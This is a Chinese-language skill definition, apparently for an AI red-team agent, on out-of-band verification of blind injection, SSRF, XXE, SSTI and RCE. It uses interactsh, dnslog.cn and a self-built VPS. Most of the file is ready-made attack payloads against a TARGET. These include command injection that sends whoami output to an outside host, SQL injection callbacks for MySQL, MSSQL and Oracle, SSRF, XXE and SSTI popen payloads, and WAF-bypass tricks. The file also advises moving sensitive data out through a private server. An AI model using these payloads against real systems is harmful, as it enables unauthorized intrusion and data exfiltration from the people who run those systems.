---
name: oob-verification
description: 带外（OOB）验证全家桶：盲注/盲 SSRF/无回显 RCE/盲 XXE 的命中判定——interactsh、dnslog.cn、自建 DNS+HTTP 服务器，外带域名生成、命中回读、误报排除
whenToUse: 目标无回显、被 WAF 拦得看不见响应差异、盲注类漏洞需要证明"真的执行了"时；命令注入/SSRF/XXE/SSTI/反序列化判定命中
role: exploit
enabled: true
---

# OOB 外带验证（盲打的判定之眼）

**没有回显不等于没打通。** 盲注、盲 SSRF、时间盲、过滤严格的命令注入——唯一能证明"载荷真的执行了"的是
**目标自己发起的一次外部请求**：DNS 查询、HTTP 回连。把"猜"变成"看见"。

## 选型表：手上有什么基础设施就用哪条路

| 方案 | 前提 | 延迟 | 适用 | 命令/操作 |
| --- | --- | --- | --- | --- |
| **interactsh-client** | 本机有二进制或 PD 官方公共服务器 | 秒级 | 通用，支持 DNS+HTTP，可脚本化 | `interactsh-client -server interact.sh` |
| **dnslog.cn / tu4.org** | 目标能出网（DNS 或 HTTP） | 秒级 | 快速手工验证，浏览器看记录 | `curl -s http://dnslog.cn/getdomain.php` |
| **自建 VPS DNS+HTTP** | 有 VPS（见 vps-reverse-shell） | 秒级 | 目标只信自家域、需要记录完整请求头、长期作战 | 见下文 |
| **时间盲注** | 无需外网 | — | 目标完全不出网时的兜底 | `sleep 5` / `WAITFOR DELAY` |

**优先级**：能出网 → interactsh；要完整 HTTP 请求/自定义域 → 自建 VPS；完全不出网 → 时间差。

## interactsh（首选）

```bash
# 起一个监听会话（公共服务器；离线靶场可自建 interactsh-server）
interactsh-client -server interact.sh -o runs/oob.log
# 它会打印一个一次性域名：xxxxx.oast.site —— 载荷里就用它
# 另开终端跑载荷，命中实时写进 -o 文件：
curl 'http://TARGET/?url=http://xxxxx.oast.site/ssrf-proof'
curl 'http://TARGET/?cmd=;nslookup+xxxxx.oast.site'
curl -H 'X: <url>http://xxxxx.oast.site/xxe</url>' 'http://TARGET/api'
# 停止：Ctrl-C；回读命中：
grep -c 'xxxxx.oast.site' runs/oob.log
```

- **一次会话一个域名**：不同载荷用不同**路径**区分（`/ssrf-proof`、`/sqli-proof`），命中日志能对上号。
- **DNS 命中 ≠ HTTP 命中**：只有 DNS 记录没有 HTTP 记录 = 目标能解析但连不出来（出网被代理/防火墙掐），SSRF 打内网仍可行，打 VPS 不可行——这个差别直接决定下一步打法。

## dnslog.cn（最快手工）

```bash
D=$(curl -s -m 10 http://dnslog.cn/getdomain.php --cookie ck.txt)
curl -s "http://TARGET/?x=;ping $D"
sleep 2; curl -s "http://dnslog.cn/getrecords.php?t=$D" --cookie ck.txt
```

坑：公共站偶尔被墙/被限速；**cookie 必须带上**（会话绑定域名）；记录 20 分钟过期，长任务改用自建。

## 自建 VPS（完整控制）

```bash
# VPS 上一键起 DNS+HTTP 捕获（见 vps-reverse-shell 的 VPS 登录方式）
sudo apt install -y dnsmasq && \
  sudo dnsmasq -u root --port=53 --bind-interfaces --log-queries --no-resolv --no-hosts &
sudo tcpdump -i any -nn port 53 or port 8080 -A > /tmp/oob.log &
# 载荷域名：*.your-vps-domain（泛解析到 VPS）或直接用 VPS IP + 时间戳路径
curl "http://TARGET/?u=http://$(date +%s).your-vps-domain:8080/proof"
```

自建的价值：**记录完整 HTTP 请求头与 body**（能证明带出了什么数据）、**自定义域名**（目标白名单只认自家域时）、**不限速不过期**。

## 各漏洞类的 OOB 载荷原文

```bash
# 命令注入（Linux / Windows 分开试）
;nslookup abc.oast.site            # 最通用：DNS 都出得去
;curl abc.oast.site/$(whoami)      # 带数据外传：主机名进路径
|nslookup%20abc.oast.site          # 空格被吃时 %20
ping -n 1 abc.oast.site            # Windows 目标（Linux ping 要 -c 1）

# SQLi 带外（各库语法）
';SELECT load_file(CONCAT('\\\\','abc.oast.site','\\x'))--        # MySQL UNC（Windows）
';DECLARE @q nvarchar(4000);SET @q='abc.oast.site';EXEC master..xp_dirtree @q--  # MSSQL
'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('abc.oast.site') FROM DUAL)||'             # Oracle

# SSRF：协议与端口都要试（DNS 命中但 HTTP 不通时改打内网段）
url=http://abc.oast.site:80/  url=http://abc.oast.site:22/  url=dict://abc.oast.site:6379/

# XXE（外部实体带文件）
<!DOCTYPE r [<!ENTITY x SYSTEM "http://abc.oast.site/%25file">]><r>&x;</r>

# SSTI / 反序列化：先确认表达式能执行，再换 OOB
{{config.__class__.__init__.__globals__['os'].popen('nslookup abc.oast.site').read()}}
```

## 失败分支

- **没有任何命中**：先证伪"我的域名本身活不活"（本机 `nslookup abc.oast.site` 应命中自己的会话）；再换通道（DNS 通但 HTTP 不通 → 载荷改纯 DNS 外带）；再换解析器（目标用内网 DNS 转发器时公共域可能解析不到 → 自建 VPS 域）。
- **命中太多分不清**：载荷里带唯一 token（时间戳/随机串）进子域或路径，别用裸域名。
- **WAF 吃载荷字符**：`;` 被拦换 `|`、`%0a`、`` ` ` ``；`http://` 被拦换 `//abc.oast.site`（协议相对）或 `http:abc.oast.site`。
- **目标 DNS 走缓存代理**：同一域名只回一次时，每次载荷换子域（`a1.abc.oast.site`、`a2.abc.oast.site`）。

## 结果落库（必须做）

- 命中记录（时间戳 + 请求内容摘要）写进 `redteam_http_evidence_add` 的 evidence —— **OOB 日志就是盲打的"原始请求"证据**。
- 判定结论进 `redteam_vuln_update`：有命中 → `confirmed`；只有 DNS 无 HTTP → 状态写 `candidate` 并在 note 里说明"出网受限"。
- `redteam_chain_add` 的 `tool` 字段写完整载荷原文（含外带域名），`result` 写命中摘要——报告复现全靠这两列。

## 纪律

- 外带域名**每轮唯一**，别把上一轮的域名当这一轮的证据。
- 公共 dnslog/interact.sh 上的域名别人也看得见：**不要把敏感数据（库内容、token）外带到公共捕获服务**，带数据一律走自建 VPS。
